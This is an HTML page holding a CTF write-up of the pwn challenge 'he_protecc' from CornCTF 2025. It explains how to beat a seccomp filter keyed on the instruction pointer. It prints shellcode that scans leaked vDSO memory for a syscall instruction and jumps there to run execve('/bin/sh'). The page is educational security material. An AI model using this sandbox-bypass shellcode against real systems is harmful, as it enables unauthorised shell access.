@@ -1,0 +1,99 @@
+<!DOCTYPE html><html lang="it" data-astro-cid-4dqtj3le> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="manifest" href="/site.webmanifest"><meta name="generator" content="Astro v5.12.3"><meta name="description" content="Articolo di ub1k @ Pwnissa"><title>he_protecc: CornCTF 2025</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"><style>.footer[data-astro-cid-sz7xmlte]{background:var(--bg-secondary);padding:60px 0 20px;border-top:1px solid var(--card-border);margin-top:0}.footer-content[data-astro-cid-sz7xmlte]{max-width:1200px;margin:0 auto;padding:0 20px;text-align:center}.footer[data-astro-cid-sz7xmlte] h2[data-astro-cid-sz7xmlte]{font-size:2rem;margin-bottom:30px;color:var(--accent-gold)}.contact-info[data-astro-cid-sz7xmlte]{display:flex;flex-direction:column;gap:15px;font-size:1.1rem}.contact-info[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{color:var(--accent-teal);text-decoration:none;transition:color .3s ease}.contact-info[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:var(--accent-gold)}.made-by[data-astro-cid-sz7xmlte]{margin-top:15px;font-size:.75rem;color:#fff;text-align:center}.made-by[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{color:#fff;text-decoration:none;transition:color .3s ease}.made-by[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:var(--accent-gold)}
+</style>
+<link rel="stylesheet" href="/_astro/he_protecc.DdGESeJp.css"></head> <body data-astro-cid-4dqtj3le> <nav id="fixedNavbar" class="fixed-navbar" data-astro-cid-uvvofgxd> <div class="navbar-container" data-astro-cid-uvvofgxd> <div class="navbar-brand" data-astro-cid-uvvofgxd> <a href="/" data-astro-cid-uvvofgxd>Pwnissa</a> </div> <div class="navbar-menu" data-astro-cid-uvvofgxd> <a href="/blog" class="navbar-link" data-astro-cid-uvvofgxd>Blog</a><a href="/members" class="navbar-link" data-astro-cid-uvvofgxd>Members</a> </div> </div> </nav> <script type="module">let e=window.scrollY;const l=document.getElementById("fixedNavbar"),o=()=>{window.scrollY>e+5&&window.scrollY>l.offsetHeight?l.classList.add("hidden"):window.scrollY<e-5&&l.classList.remove("hidden"),e=window.scrollY};window.addEventListener("scroll",o);document.addEventListener("DOMContentLoaded",()=>{l.classList.remove("hidden")});</script>  <main class="blog-container" data-astro-cid-4dqtj3le> <div class="blog-header" data-astro-cid-4dqtj3le> <a href="/" class="back-link" data-astro-cid-4dqtj3le>← Torna alla home</a> <div class="article-meta" data-astro-cid-4dqtj3le> <h1 data-astro-cid-4dqtj3le>he_protecc: CornCTF 2025</h1> <div class="meta-info" data-astro-cid-4dqtj3le> <span class="author" data-astro-cid-4dqtj3le>di ub1k</span> <span class="date" data-astro-cid-4dqtj3le>6/8/2025</span> <div class="tags" data-astro-cid-4dqtj3le> <span class="tag pwn" data-astro-cid-4dqtj3le>pwn</span> </div> </div> </div> </div> <article class="article-content" data-astro-cid-4dqtj3le> <h1 id="he_protecc-cornctf-2025">he_protecc: CornCTF 2025</h1>
+<blockquote>
+<p><strong>Solved by: Ub1k</strong>, <strong>Writeup by: Ub1k</strong></p>
+</blockquote>
+<h1 id="introduction">Introduction</h1>
+<p>This is the first pwn challenge in the CornCTF 2025.
+Upon inspecting the binary we immediatly notice two things:</p>
+<ol>
+<li><strong>The security mitigations are very relaxed</strong>: the GOT is writable (Partial RELRO) and the code area is not position independent (No PIE) and as such is not randomized.</li>
+<li><strong>The ELF is statically linked</strong>: so we can exclude ret2libc and we have to ignore shenanigans with dynamic libraries this time.</li>
+</ol>
+<p><img src="/_astro/he_protecc-018.CrO7jXo3_27wAjV.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="931" height="228"></p>
+<p>By executing the binary we are prompted to input the length of some shellcode followed by the code itself.</p>
+<p><img src="/_astro/he_protecc-02.D7Gj31ph_Z23RFIV.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="930" height="116"></p>
+<p>It would definitely be too easy if we could execute a <code>execve(&quot;/bin/sh&quot;,null,null)</code> and get the shell.
+Let’s take a closer look at the binary to see what’s really happening.</p>
+<h1 id="looking-around">Looking around</h1>
+<p>Disassembling the binary reveals an easy to read and understand code, let’s look at the most important stuff.</p>
+<p><img src="/_astro/he_protecc-013.C-uIgH5M_1MVeAa.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="981" height="573"></p>
+<h2 id="mmap-my-beloved">mmap my beloved</h2>
+<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">📋</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p><strong>mmap</strong>() creates a new mapping in the virtual address space of the calling process. In other words, it creates a new data area in a position and with permissions decided by the caller, it is used in dynamically loaded binaries and in some cases in heap allocation.
+In our case the program needs a mmap region because we don’t have an area that is writable and executable at the same time.</p> </div> </div> 
+<p>The mmap call is easy to understand:</p>
+<ul>
+<li>New memory area is <strong>mapped</strong> at position <code>0x500000</code>.</li>
+<li>The <strong>size</strong> is <code>0x1000</code> bytes (one page or 4096 bytes).</li>
+<li>The p<strong>ermission</strong> parameter is <code>RWX</code>: <code>001 | 010 | 100 = 111 (7)</code></li>
+</ul>
+<p>To understand the flags we can use the <code>strace</code> command and read the instruction from there:</p>
+<p><img src="/_astro/he_protecc-012.DCGW1Bmk_ZuiNuV.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="931" height="41"></p>
+<p>These two flags simply signal that the mapped region is private to our process and not mapped to any file, this means the area is initialized with zeroes.</p>
+<p>A boring mmap region, nothing special here… sadly</p>
+<h2 id="seccomp">seccomp</h2>
+<p>I’m not going to show the full <code>setup_seccomp()</code> disassembly as it is a bit ugly, the important part comes at the end:</p>
+<p><img src="/_astro/he_protecc-014.COnVflIk_OueNR.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="936" height="85"></p>
+<p>The <code>prctl</code> call sets the <strong>NO_NEW_PRIVS</strong> flag, why?  This is a security measure to stop privilege escalation made by malformed seccomp filter, so we put it before every seccomp installation (<a href="https://unix.stackexchange.com/questions/562260/why-we-need-to-set-no-new-privs-while-before-calling-seccomp-mode-filter">explanation</a>).
+The next instruction, the syscall, installs a seccomp filter on the binary.</p>
+<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">📋</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p>As the name suggests, seccomp is a mechanism to harden syscall access by evaluating a small program called a Berkeley Packet Filter (BPF) for every syscall. Based on the result, the syscall is either allowed or denied.</p> </div> </div> 
+<p>So the questions becomes: What does this seccomp filter allow?
+I was today years old when I learned that I don’t need to manually decode seccomp filters… there exists a tool for that, thanks Marco. (<a href="https://github.com/david942j/seccomp-tools">Github</a>):</p>
+<p>So by executing <code>seccomp-tools dump ./protected</code> we get:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="plaintext"><code><span class="line"><span> line  CODE  JT   JF     K</span></span>
+<span class="line"><span>=================================</span></span>
+<span class="line"><span> 0000: 0x20 0x00 0x00 0x00000008  A = instruction_pointer</span></span>
+<span class="line"><span> 0001: 0x01 0x00 0x00 0x003fffff  X = 4194303 (0x3fffff)</span></span>
+<span class="line"><span> 0002: 0x2d 0x00 0x0a 0x00000000  if (A &lt;= X) goto 0013</span></span>
+<span class="line"><span> 0003: 0x01 0x00 0x00 0x004b7fff  X = 4947967 (0x4b7fff)</span></span>
+<span class="line"><span> 0004: 0x2d 0x00 0x07 0x00000000  if (A &lt;= X) goto 0012</span></span>
+<span class="line"><span> 0005: 0x01 0x00 0x00 0x004fffff  X = 5242879 (0x4fffff)</span></span>
+<span class="line"><span> 0006: 0x2d 0x00 0x06 0x00000000  if (A &lt;= X) goto 0013</span></span>
+<span class="line"><span> 0007: 0x01 0x00 0x00 0x00500fff  X = 5246975 (0x500fff)</span></span>
+<span class="line"><span> 0008: 0x2d 0x00 0x03 0x00000000  if (A &lt;= X) goto 0012</span></span>
+<span class="line"><span> 0009: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer &gt;&gt; 32</span></span>
+<span class="line"><span> 0010: 0x01 0x00 0x00 0x00007fff  X = 32767 (0x7fff)</span></span>
+<span class="line"><span> 0011: 0x2d 0x00 0x01 0x00000000  if (A &lt;= X) goto 0013</span></span>
+<span class="line"><span> 0012: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS</span></span>
+<span class="line"><span> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW```</span></span></code></pre>
+<p>This is <em>not</em> a typical seccomp filter. Normally a seccomp filter checks the syscall number against a whitelist and returns if it is permitted or not, but here the filter loads the <code>RIP</code> at the moment of execution of the syscall and only returns ALLOW if the position is one of the following, else the process gets killed:</p>
+<ul>
+<li>Before <code>0x3FFFFF</code>: but that’s not possible because the address space starts at <code>0x400000</code></li>
+<li>Between <code>0x4b7fff</code> and <code>0x4fffff</code>: but there are no syscalls in that region.</li>
+<li>Between <code>0x500fff</code> and <code>0x7fffffffffff</code>:  After the mmap regio, so this is why we can’t execute a syscall in the shellcode :(</li>
+</ul>
+<p>But WAIT, what can we find after <code>0x500fff</code> but before <code>0x7fffffffffff</code>?</p>
+<p>Let’s run our debugger of choice and look at the mappings:</p>
+<p><img src="/_astro/he_protecc-015.DafyO2b1_Z250ajF.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1231" height="356"></p>
+<p>Using <code>vmmap</code> we can see that only one mapping has read and execution permission, and that is <code>vdso</code>.</p>
+<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">📋</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p><strong>vDSO</strong> (virtual dynamic shared object) is a kernel mechanism for exporting a carefully selected set of kernel space routines to user space applications so that applications can call these kernel space routines in-process, without incurring the performance penalty of a mode switch from user mode to kernel mode. (<a href="https://en.wikipedia.org/wiki/VDSO">Wikipedia</a>)</p> </div> </div> 
+<p>By piping the instructions found in that memory area into <code>grep</code> we can see a few syscall instruction inside <code>vdso</code>, jumping to them should give us the syscall we need!</p>
+<p><img src="/_astro/he_protecc-016.8IEv6FMl_1uLrko.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="813" height="131"></p>
+<h1 id="leak--pwn">Leak &amp; Pwn</h1>
+<p>Here comes the problem, even if the ELF is not PIE, the stack and also <code>vdso</code> still get randomized by <strong>ASLR</strong>, even worse, the internal offsets also get randomized… But let’s tackle one problem after another:</p>
+<h2 id="the-leak">The Leak</h2>
+<p>Using <code>p2p stack vdso</code> we can see 4 leaks on the stack for <strong>vdso</strong>.</p>
+<p><img src="/_astro/he_protecc-017.nBq35lx6_ZKlbjN.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1074" height="108"></p>
+<h2 id="assembly">Assembly</h2>
+<p>Now comes the <em>difficult</em> part, we can’t calculate the offset between the syscalls and our leak because we cannot guarantee that the internal offsets are constant, we need to scan the memory area…</p>
+<p>The first part is easy, let’s take the first leak and put it into a register:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> r8</span><span style="color:#F8F8F2">, [</span><span style="color:#BD93F9">rbp</span><span style="color:#F8F8F2"> - </span><span style="color:#BD93F9">0x218</span><span style="color:#F8F8F2">]</span></span></code></pre>
+<p>We could zero out the 12 least significant bits to align the address to a page start, but in our case it doesn’t matter.
+Now let’s scan the memory area for a syscall, remember that the opcode is <code>0x0F05</code> but we are in little-endian:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#FF79C6">loop</span><span style="color:#F8F8F2">:</span></span>
+<span class="line"><span style="color:#FF79C6">inc</span><span style="color:#BD93F9"> r8</span></span>
+<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> ax</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">word</span><span style="color:#F8F8F2"> ptr [</span><span style="color:#BD93F9">r8</span><span style="color:#F8F8F2">]</span></span>
+<span class="line"><span style="color:#FF79C6">cmp</span><span style="color:#BD93F9"> ax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">0x050f</span></span>
+<span class="line"><span style="color:#FF79C6">jne</span><span style="color:#FF79C6"> loop</span></span></code></pre>
+<p>This code snipped increases <code>r8</code> (pointer to <code>vdso</code> leak) and takes two bytes, it then checks if the bytes are equal to the one representing a syscall and if not it loops. If it exits the loop, <code>r8</code> will point to a valid syscall instruction, and we can continue with setting the other registers for an execve call.</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="asm"><code><span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> r9</span><span style="color:#F8F8F2">, {u64(b&quot;/bin/sh\</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">&quot;)}</span></span>
+<span class="line"><span style="color:#FF79C6">push</span><span style="color:#BD93F9"> r9</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rax</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">59</span><span style="color:#F8F8F2"> </span></span>
+<span class="line"><span style="color:#FF79C6">mov</span><span style="color:#BD93F9"> rdi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rsp</span></span>
+<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rsi</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rsi</span></span>
+<span class="line"><span style="color:#FF79C6">xor</span><span style="color:#BD93F9"> rdx</span><span style="color:#F8F8F2">, </span><span style="color:#BD93F9">rdx</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">jmp</span><span style="color:#BD93F9"> r8</span><span style="color:#F8F8F2"> // &lt;-- jump to </span><span style="color:#FF79C6">syscall</span><span style="color:#F8F8F2"> outside our mmap area</span></span></code></pre>
+<p>and boom, we have a shell.</p> </article> </main> <footer class="footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <h2 data-astro-cid-sz7xmlte>Contacts</h2> <div class="contact-info" data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>📧 Email: <a href="mailto:info@pwnissa.it" data-astro-cid-sz7xmlte>info@pwnissa.it</a></p> <p data-astro-cid-sz7xmlte>🐙 GitHub: <a href="https://github.com/pwnissa" target="_blank" data-astro-cid-sz7xmlte>https://github.com/pwnissa</a></p> <p data-astro-cid-sz7xmlte>📍 Università degli Studi di Genova, DIBRIS</p> </div> <p class="made-by" data-astro-cid-sz7xmlte>Made with ♥ by <a href="https://stealthguy.net" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>stealthguy</a></p> </div> </footer>  </body></html>
